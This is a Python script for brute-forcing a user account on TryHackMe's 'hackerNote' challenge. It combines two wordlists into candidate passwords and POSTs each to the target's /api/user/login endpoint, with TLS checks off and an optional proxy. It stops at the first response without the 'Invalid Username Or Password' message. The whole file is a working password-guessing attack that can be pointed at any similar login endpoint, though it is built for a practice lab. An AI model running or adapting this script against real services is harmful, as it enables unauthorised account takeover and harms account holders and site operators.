#!/usr/bin/env python3

# AJ2K
# A script to bruteforce a user account on the TryHackMe 'hackerNote' challenge

import requests, colorama, argparse, re
from colorama import Fore, Style, init, Back

parser = argparse.ArgumentParser(description='Args')
requiredNamed = parser.add_argument_group('Required Arguments')
requiredNamed.add_argument("-u", dest="URL",  help="protocol:host eg http(s)://x.x.x.x", required=True)
requiredNamed.add_argument("-U", dest="user",  help="The username to try", required=True)
requiredNamed.add_argument("-c", dest="Wordlist1", help="The list of colors to try", required=True)
requiredNamed.add_argument("-n", dest="Wordlist2", help="The list of numbers to try", required=True)
parser.add_argument("-p", dest="Proxy", help="protocol:host:port eg http://127.0.0.1:8080", required=False)
args = parser.parse_args()

try:
     url = args.URL
     if url.endswith('/'):
          url = url.rstrip('/')
     else:
          pass
     url = url + "/api/user/login"
     wordlist1 = args.Wordlist1
     wordlist2 = args.Wordlist2
     username = args.user
except:
     error()

if args.Proxy is None:
     proxybool = False
else:
     proxiesarg = args.Proxy
     proxybool = True


headers = {
"Accept-Language": "en-US,en;q=0.5",
"Content-Type": "application/json",
"Origin": url
}


if (proxybool):
     proxy = {
     "http": proxiesarg,
     "https": proxiesarg
     }
else:
    pass

count = 1
fullLineCount = 0
bad = 'Invalid Username Or Password'

with open(wordlist1) as colors:
     for line in colors:
          with open(wordlist2) as numbers:
               for line2 in numbers:
                    fullLineCount += 1
     print("Total Requests: "+str(fullLineCount))
     print("Request Number \t\t    Payload")

with open(wordlist1) as colors:
     for line in colors:
          with open(wordlist2) as numbers:
               for line2 in numbers:
                     password = line.strip()+line2.strip()
                     data = '{"username":"'+username+'","password":"'+password+'"}'
                     if proxybool:
                          r = requests.post(url, proxies=proxy, headers=headers, data=data, verify=False)
                     else:
                          r = requests.post(url, headers=headers, data=data, verify=False)
                     if not re.search(bad, r.text):
                          print(Fore.GREEN + Style.BRIGHT + "", end=f"\r      {count}       {data} - VALID\n")
                          quit()
                     else:
                          print(Style.RESET_ALL + "", end=f"\r      {count}       {data}        ")
                     count += 1
